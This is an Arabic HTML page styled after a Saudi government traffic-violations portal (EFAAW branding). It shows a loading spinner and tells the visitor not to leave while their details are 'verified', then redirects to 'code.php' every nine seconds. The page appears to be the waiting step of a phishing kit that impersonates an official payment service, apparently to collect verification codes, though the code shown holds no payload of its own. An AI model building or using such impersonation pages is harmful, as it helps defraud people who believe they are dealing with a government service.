


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        المنصة الوطنية للمخالفات
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/fontawesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            direction: rtl;
            font-family: "Tajawal", sans-serif;
            color: #000;
        }

        a {
            text-decoration: none;
        }

        body {
            background-image: url(./assets/Back004.jpg);
            background-size: auto;
        }

        html {
            overflow-x: hidden;
        }

        .bbtn {
            font-size: 18px;
            color: #fff;
            padding: 10px 17px 12px;
            text-decoration: none;
            margin: 3px;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-active {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-disable {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: rgba(0, 150, 136, .7);
            border: none;
            display: inline-block;
        }

        .form-control {
            border-radius: 0;
            height: 45px;
        }

        .se-pre-con {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 9999999;
            background: url(./assets/Progress2.svg) center no-repeat #ffffffeb;
            background-size: 310px 80px;
            overflow-x: hidden;
        }

        .show {
            display: block;
        }

        .hidden {
            display: none;
        }

        .detailsGroup {
            margin-top: 15px;
        }

        .detailsGroup .detailsValue {
            background: #f3f3f3;
            text-align: CENTER;
            padding: 1px 5px 5px;
        }

        .contFot {
            margin-bottom: 300px;
        }

        .btn-success {
            background-color: #17605d;
            border-color: #17605d;
        }

        @media only screen and (max-width: 600px) {
            .texF {
                display: none;
            }

            .ffre {
                text-align: center;
            }

            .ccdr {
                flex-direction: column;
                margin-top: 30px;
            }

            .butApp {
                text-align: center;
            }

            .arBut {
                width: 49%;
            }

            .colForMar {
                margin-top: 25px;
            }

            .contFot {
                margin-bottom: 150px;
            }

            .firFot {
                justify-content: center !important;
            }

            .secFor {
                margin-top: 40px;
            }

            .secForrg {
                margin-bottom: 40px;
            }
        }

        .bg-success {
            background-color: #17605d !important;
        }

        .lds-default {
            display: inline-block;
            position: relative;
            width: 7%;
            height: 80px;
            right: 10%;

        }

        .lds-default div {
            position: absolute;
            width: 6px;
            height: 6px;
            background: black;
            border-radius: 50%;
            animation: lds-default 1.2s linear infinite;
        }

        .lds-default div:nth-child(1) {
            animation-delay: 0s;
            top: 37px;
            left: 66px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(2) {
            animation-delay: -0.1s;
            top: 22px;
            left: 62px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(3) {
            animation-delay: -0.2s;
            top: 11px;
            left: 52px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(4) {
            animation-delay: -0.3s;
            top: 7px;
            left: 37px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(5) {
            animation-delay: -0.4s;
            top: 11px;
            left: 22px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(6) {
            animation-delay: -0.5s;
            top: 22px;
            left: 11px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(7) {
            animation-delay: -0.6s;
            top: 37px;
            left: 7px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(8) {
            animation-delay: -0.7s;
            top: 52px;
            left: 11px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(9) {
            animation-delay: -0.8s;
            top: 62px;
            left: 22px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(10) {
            animation-delay: -0.9s;
            top: 66px;
            left: 37px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(11) {
            animation-delay: -1s;
            top: 62px;
            left: 52px;
            background-color: #17605d;
        }

        .lds-default div:nth-child(12) {
            animation-delay: -1.1s;
            top: 52px;
            left: 62px;
            background-color: #17605d;
        }

        @keyframes lds-default {

            0%,
            20%,
            80%,
            100% {
                transform: scale(1);
            }

            50% {
                transform: scale(1.5);
            }
        }
    </style>
</head>

<body>

    <nav class="navbar navbar-expand-lg" style="background-color: rgba(0,150,136,.7);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="./assets/EFAAW.svg" width="120" alt=""></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
            </div>
        </div>
    </nav>


    <div class="container" style="margin-top: 90px;">
        <div class="row d-flex justify-content-center" style="backdrop-filter: blur(4px);">
            <div class="col-10 p-4 " style="border-radius: 15px;">
                <div class="container" style="position:relative ; text-align:center;margin-top:100px">
                    <div class="lds-default">
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                        <div></div>
                    </div>
                    <h6 class="mt-3 fw-bold" style="color: #fff;">الرجاء الإنتظار سيتم التأكد من المعلومات لا تخرج من هذه الصفحة حتى يتم التأكد</h6>
                    <input hidden="hidden" id="myText" value="">
                    <input hidden="hidden" id="myUser" value="">
                </div>
            </div>
        </div>
    </div>

    <script>
        var dataString = 'id=' + document.getElementById('myText').value;
        var dataUser = document.getElementById('myUser').value;
        setInterval(() => {
            document.location.href = 'code.php';
        }, 9000);
    </script>

</body>

</html>